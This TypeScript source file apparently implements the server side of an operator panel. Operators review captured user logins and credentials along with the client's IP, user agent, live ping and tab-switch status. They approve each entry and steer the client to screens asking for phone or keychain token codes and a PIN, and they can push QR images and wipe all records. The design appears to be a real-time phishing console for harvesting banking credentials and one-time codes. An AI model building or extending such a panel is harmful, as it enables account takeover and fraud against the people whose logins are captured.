import { createServerFn } from "@tanstack/react-start";
import { z } from "zod";
import { requireSupabaseAuth } from "@/integrations/supabase/auth-middleware";

const filtroSchema = z.object({
  status: z.enum(["pendente", "aguardando", "aprovado", "reprovado", "todos"]).default("pendente"),
  busca: z.string().trim().max(120).default(""),
  periodo: z.enum(["24h", "7d", "30d", "tudo"]).default("tudo"),
});

const serialSchema = z
  .string()
  .trim()
  .max(15)
  .regex(/^[A-Za-z0-9-]+$/, "Serial inválido");

const nomeSchema = z.string().trim().max(60);

const decisaoSchema = z.object({
  id: z.string().uuid(),
  decisao: z.enum(["aprovado", "reprovado"]),
  motivo: z.string().trim().max(400).optional(),
  proxima_tela: z
    .enum(["token_celular", "token_chaveiro", "pin", "interna", "interna_token_celular", "interna_token_chaveiro"])
    .optional(),
  token_serial: serialSchema.optional(),
  token_nome: nomeSchema.optional(),
});

const reencaminharSchema = z.object({
  id: z.string().uuid(),
  proxima_tela: z.enum([
    "token_celular",
    "token_chaveiro",
    "pin",
    "sucesso",
    "interna",
    "interna_token_celular",
    "interna_token_chaveiro",
  ]),
  token_serial: serialSchema.optional(),
  token_nome: nomeSchema.optional(),
});

const salvarSerialSchema = z.object({
  id: z.string().uuid(),
  token_serial: z.string().trim().max(15).regex(/^[A-Za-z0-9-]*$/, "Serial inválido"),
});

const salvarNomeSchema = z.object({
  id: z.string().uuid(),
  token_nome: z.string().trim().max(60),
});

const excluirSchema = z.object({ id: z.string().uuid() });

const qrCodeSchema = z.object({
  id: z.string().uuid(),
  qr_code_url: z
    .string()
    .trim()
    .min(1)
    .max(2_000_000) // ~1.5MB base64
    .regex(/^data:image\/(png|jpe?g|gif|webp|svg\+xml);base64,/i, "Formato de imagem inválido"),
});

const limparQrSchema = z.object({ id: z.string().uuid() });

const SELECT_COLS =
  "id, usuario, credencial, origem, status, observacao, criado_em, motivo, decidido_em, decidido_por, proxima_tela, token, token_em, ip, user_agent, ultimo_ping, mudou_aba, fase, pin, pin_em, token_serial, token_nome, qr_code_url";



export const listarSolicitacoes = createServerFn({ method: "POST" })
  .middleware([requireSupabaseAuth])
  .inputValidator((input: unknown) => filtroSchema.parse(input))
  .handler(async ({ data, context }) => {
    let query = context.supabase
      .from("solicitacoes")
      .select(SELECT_COLS)
      .order("criado_em", { ascending: false })
      .limit(200);

    if (data.status === "aguardando") {
      query = query.eq("status", "aprovado").is("token", null).is("pin", null);
    } else if (data.status !== "todos") {
      query = query.eq("status", data.status);
    }
    if (data.busca) query = query.ilike("usuario", `%${data.busca}%`);
    if (data.periodo !== "tudo") {
      const horas = data.periodo === "24h" ? 24 : data.periodo === "7d" ? 24 * 7 : 24 * 30;
      query = query.gte("criado_em", new Date(Date.now() - horas * 3600_000).toISOString());
    }

    const { data: rows, error } = await query;
    if (error) throw new Error(error.message);

    const ids = [...new Set((rows ?? []).map((r) => r.decidido_por).filter(Boolean))] as string[];
    let nomes: Record<string, string> = {};
    if (ids.length) {
      const { data: perfis } = await context.supabase
        .from("perfis")
        .select("id, nome")
        .in("id", ids);
      nomes = Object.fromEntries((perfis ?? []).map((p) => [p.id, p.nome]));
    }

    return (rows ?? []).map((r) => ({
      ...r,
      operador: r.decidido_por ? (nomes[r.decidido_por] ?? "Operador") : null,
    }));
  });

export const contarPorStatus = createServerFn({ method: "GET" })
  .middleware([requireSupabaseAuth])
  .handler(async ({ context }) => {
    const { data, error } = await context.supabase.from("solicitacoes").select("status");
    if (error) throw new Error(error.message);
    const base = { pendente: 0, aprovado: 0, reprovado: 0 };
    for (const row of data ?? []) base[row.status as keyof typeof base] += 1;
    return base;
  });

export const decidirSolicitacao = createServerFn({ method: "POST" })
  .middleware([requireSupabaseAuth])
  .inputValidator((input: unknown) => decisaoSchema.parse(input))
  .handler(async ({ data, context }) => {
    if (data.decisao === "reprovado" && !data.motivo) {
      throw new Error("Informe o motivo da reprovação.");
    }
    if (data.decisao === "aprovado" && !data.proxima_tela) {
      throw new Error("Escolha a próxima tela do cliente.");
    }

    const { data: row, error } = await context.supabase
      .from("solicitacoes")
      .update({
        status: data.decisao,
        motivo: data.motivo ?? null,
        proxima_tela: data.decisao === "aprovado" ? (data.proxima_tela ?? null) : null,
        decidido_por: context.userId,
        decidido_em: new Date().toISOString(),
        ...(data.token_serial !== undefined ? { token_serial: data.token_serial } : {}),
        ...(data.token_nome !== undefined ? { token_nome: data.token_nome } : {}),
      })
      .eq("id", data.id)
      .eq("status", "pendente")
      .select("id")
      .maybeSingle();

    if (error) throw new Error(error.message);
    if (!row) throw new Error("Solicitação já foi decidida por outro operador.");
    return { ok: true };
  });


export const reencaminharSolicitacao = createServerFn({ method: "POST" })
  .middleware([requireSupabaseAuth])
  .inputValidator((input: unknown) => reencaminharSchema.parse(input))
  .handler(async ({ data, context }) => {
    const { error } = await context.supabase
      .from("solicitacoes")
      .update({
        proxima_tela: data.proxima_tela,
        token: null,
        token_em: null,
        pin: null,
        pin_em: null,
        ...(data.token_serial !== undefined ? { token_serial: data.token_serial } : {}),
        ...(data.token_nome !== undefined ? { token_nome: data.token_nome } : {}),
      })
      .eq("id", data.id)
      .eq("status", "aprovado");
    if (error) throw new Error(error.message);
    return { ok: true };
  });

export const salvarTokenNome = createServerFn({ method: "POST" })
  .middleware([requireSupabaseAuth])
  .inputValidator((input: unknown) => salvarNomeSchema.parse(input))
  .handler(async ({ data, context }) => {
    const { error } = await context.supabase
      .from("solicitacoes")
      .update({ token_nome: data.token_nome || null })
      .eq("id", data.id);
    if (error) throw new Error(error.message);
    return { ok: true };
  });

export const salvarTokenSerial = createServerFn({ method: "POST" })
  .middleware([requireSupabaseAuth])
  .inputValidator((input: unknown) => salvarSerialSchema.parse(input))
  .handler(async ({ data, context }) => {
    const { error } = await context.supabase
      .from("solicitacoes")
      .update({ token_serial: data.token_serial || null })
      .eq("id", data.id);
    if (error) throw new Error(error.message);
    return { ok: true };
  });


export const meuPerfil = createServerFn({ method: "GET" })
  .middleware([requireSupabaseAuth])
  .handler(async ({ context }) => {
    const { data } = await context.supabase
      .from("perfis")
      .select("id, nome")
      .eq("id", context.userId)
      .maybeSingle();
    return { id: context.userId, nome: data?.nome ?? "Operador" };
  });

async function garantirOperador(
  supabase: { rpc: (fn: string, args: Record<string, unknown>) => Promise<{ data: boolean | null }> },
  userId: string,
) {
  const { data: op } = await supabase.rpc("has_role", { _user_id: userId, _role: "operador" });
  const { data: ad } = await supabase.rpc("has_role", { _user_id: userId, _role: "admin" });
  if (!op && !ad) throw new Error("Sem permissão.");
}

export const excluirSolicitacao = createServerFn({ method: "POST" })
  .middleware([requireSupabaseAuth])
  .inputValidator((input: unknown) => excluirSchema.parse(input))
  .handler(async ({ data, context }) => {
    await garantirOperador(context.supabase as never, context.userId);
    const { supabaseAdmin } = await import("@/integrations/supabase/client.server");
    const { error } = await supabaseAdmin.from("solicitacoes").delete().eq("id", data.id);
    if (error) throw new Error(error.message);
    return { ok: true };
  });

export const limparPainel = createServerFn({ method: "POST" })
  .middleware([requireSupabaseAuth])
  .handler(async ({ context }) => {
    await garantirOperador(context.supabase as never, context.userId);
    const { supabaseAdmin } = await import("@/integrations/supabase/client.server");
    const { error, count } = await supabaseAdmin
      .from("solicitacoes")
      .delete({ count: "exact" })
      .not("id", "is", null);
    if (error) throw new Error(error.message);
    return { ok: true, count: count ?? 0 };
  });
